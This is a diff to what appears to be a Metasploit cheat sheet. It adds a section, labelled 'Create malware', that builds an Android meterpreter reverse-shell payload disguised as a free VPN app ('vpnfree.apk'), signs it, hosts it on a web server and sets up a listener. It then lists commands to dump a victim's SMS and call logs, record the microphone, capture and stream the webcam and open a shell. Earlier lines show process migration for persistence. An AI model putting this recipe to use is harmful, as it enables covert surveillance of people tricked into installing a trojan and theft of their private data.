@@ -28,6 +28,8 @@
   - ```use  auxiliary/scanner/mongodb/mongodb_login```
   - ```set rhosts 192.168.1.0/24```
   - ```run```
+- Web scanner path 
+  - ```/usr/share/metasploit-framework/modules/auxiliary/scanner/http/```
 
 
 ## Exploit
@@ -74,3 +76,34 @@
   - ```ps```
   - ```migrate 596```
     - 596 is PID of service.exe - DLL Hijack for persistant
+
+
+## msfvenom
+- Create malware
+  - ```msfvenum -p android/meterpreter/reverse_tcp -e shikata-ga-nai lhost=192.168.1.18 lport=443 R > /var/www/html/vpnfree.apk``` 
+  - ```Keytool -genkey -v -keystore nss.keystore -alias nss -keyalg RSA -keysize 2048 -validity 100000```
+  - ```jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore nss.keystore /var/www/html/vpnfree.apk nss```
+- Listen in Kali (msfconsole)
+  - ```use exploit/multi/handler```
+  - ```set payload android/meterpreter/reverse_tcp```
+  - ```set lhost 192.168.1.18```
+  - ```set lport 443```
+  - ```run -j```
+- Exploit
+  - ```sessions -l```
+  - ```sessions -i 1```
+  - ```dump_sms```
+  - ```dump_calllog```
+  - ```record_mic -d 15```
+  - ```Webcam_snap```
+  - ```webcam_snap -h```
+  - ```webcam_stream```
+  - ```app_list```
+    - show mobile app's 
+  - ```app_run```
+    - run one of above app 
+  - ```shell```
+    - open mobile shell  
+     
+
+
